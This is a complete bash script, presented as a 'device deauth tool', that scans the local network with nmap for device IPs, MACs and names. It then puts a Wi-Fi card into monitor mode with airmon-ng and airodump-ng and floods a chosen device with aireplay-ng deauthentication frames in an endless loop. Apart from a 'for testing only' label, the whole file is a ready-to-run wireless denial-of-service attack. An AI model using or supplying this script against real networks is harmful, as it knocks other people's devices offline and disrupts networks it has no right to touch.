#!/bin/bash

echo "=========================================="
echo "📡 BOCL Full Device Deauth Tool"
echo "🔍 Hostnames + MAC + Deauth (For Testing Only)"
echo "=========================================="

# Auto cleanup on Ctrl+C
cleanup() {
    echo -e "\n🧹 Cleaning up..."
    if [[ "$MONMODE" = true ]]; then
        sudo airmon-ng stop "$MON_IFACE"
        sudo service NetworkManager restart
        sudo rfkill unblock all
    fi
    echo "✅ Reverted system. Exiting."
    exit
}
trap cleanup INT

# Step 1: Get your IP and subnet
echo "[1] Getting your IP and network info..."
MYIP=$(ip addr show | awk '/inet / && $2 !~ /127.0.0.1/ {print $2}' | head -n1)

if [ -z "$MYIP" ]; then
    echo "❌ Could not determine your IP address."
    exit 1
fi

SUBNET=$MYIP
echo "🌐 Your IP/Subnet: $SUBNET"

# Step 2: Scan network for hostnames + MACs with clean formatting
echo "[2] Scanning network for connected devices (takes ~10 sec)..."
echo "IP              MAC Address          Device Name"
echo "------------------------------------------------"
sudo nmap -sn "$SUBNET" | awk '
/Nmap scan report for/ {
    ip = $NF
    gsub(/[()]/, "", ip)
}
/MAC Address:/ {
    mac = $3
    name = substr($0, index($0,$4))
    gsub(/[()]/, "", name)
    printf "%-15s %-19s %s\n", ip, mac, name
}' || echo "⚠️  No devices found. Make sure you're connected to Wi-Fi."

echo "=========================================="

# Step 3: Ask for target MAC with validation
while true; do
    echo "💡 Enter the MAC address of the **device** you want to deauth (not the router)."
    echo "   Example: 3C:5A:B4:12:34:56"
    read -p "Enter TARGET MAC address: " TARGET

    if [[ "$TARGET" =~ ^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$ ]]; then
        break
    else
        echo "❌ Invalid MAC format. Try again."
    fi
done

# Step 4: List interfaces and ask user
echo "[3] Available Wi-Fi interfaces:"
iwconfig | grep "IEEE 802.11"
read -p "Enter your Wi-Fi interface (e.g., wlan0): " IFACE

# Step 5: Enable monitor mode
echo "⚙️ Enabling monitor mode on $IFACE..."
sudo airmon-ng check kill
sudo airmon-ng start "$IFACE"
MON_IFACE="${IFACE}mon"
MONMODE=true

# Step 6: Scan networks for router
echo "[4] Scanning for Wi-Fi routers (Press Ctrl+C when you see your router)..."
sleep 2
sudo airodump-ng "$MON_IFACE"

# Step 7: Get router BSSID and channel
while true; do
    read -p "Enter your router BSSID (from airodump): " BSSID
    if [[ "$BSSID" =~ ^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$ ]]; then
        break
    else
        echo "❌ Invalid BSSID format. Try again."
    fi
done

while true; do
    read -p "Enter your router channel number: " CHANNEL
    if [[ "$CHANNEL" =~ ^[0-9]+$ ]]; then
        break
    else
        echo "❌ Invalid channel number. Try again."
    fi
done

# Step 8: Set monitor interface to router's channel (fixes 'No such BSSID' error)
echo "🔄 Setting monitor interface $MON_IFACE to channel $CHANNEL..."
sudo iwconfig "$MON_IFACE" channel "$CHANNEL"

# Step 9: Start deauth attack
echo "💥 Starting deauth attack on target: $TARGET"
echo "🛑 Press Ctrl+C to stop and restore your system."

while true; do
    sudo aireplay-ng --deauth 10 -a "$BSSID" -c "$TARGET" "$MON_IFACE"
    sleep 1
done
